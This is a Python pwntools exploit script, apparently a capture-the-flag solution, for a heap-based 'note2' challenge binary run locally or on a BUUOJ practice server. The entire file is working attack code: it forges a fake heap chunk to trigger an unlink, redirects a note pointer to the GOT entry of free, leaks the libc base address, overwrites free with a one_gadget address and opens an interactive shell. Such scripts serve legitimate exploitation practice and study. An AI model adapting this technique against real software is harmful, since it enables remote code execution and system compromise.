import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./note2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./note2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',28062)
			elf=ELF('./note2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('option--->>','1')
			io.sendlineafter('(less than 128)',str(a))
			io.sendlineafter('content:\n',c)

		def delete(a):
			io.sendlineafter('option--->>','4')
			io.sendlineafter('of the note:',str(a))

		def edit(a,b,c):
			io.sendlineafter('option--->>','3')
			io.sendlineafter('of the note:',str(a))
			io.sendlineafter('[1.overwrite/2.append]',str(b))
			io.sendlineafter('Contents:',c)

		def show(a):
			io.sendlineafter('option--->>','2')
			io.sendlineafter('id of the note:',str(a))
		
		io.recv()
		io.sendline('a')
		io.recv()
		io.sendline('a')
		ptr_0 = 0x602120
		fake_fd = ptr_0 - 0x18
		fake_bk = ptr_0 - 0x10
		note0_content = "\x00" * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)
		add(0x80, note0_content) #note0
		add(0x0, "aa") #note1
		add(0x80, "bb") #note2

		delete(1)
		note1_content = "\x00" * 16 + p64(0xa0) + p64(0x90)
		add(0x0, note1_content)

		delete(2) #unlink

		free_got = elf.got["free"]
		payload = 0x18 * "a" + p64(free_got)
		edit(0, 1, payload)

		show(0)
		io.recvuntil("is ")

		free_addr = u64(io.recv(6).ljust(8, "\x00"))
		libc_addr = free_addr - libc.symbols["free"]
		print("libc address: " + hex(libc_addr))

		#get shell
		system_addr = libc_addr + libc.symbols["system"]
		one_gadget = libc_addr + 0xf02a4
		edit(0, 1, p64(one_gadget)) #overwrite free got -> system address

		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue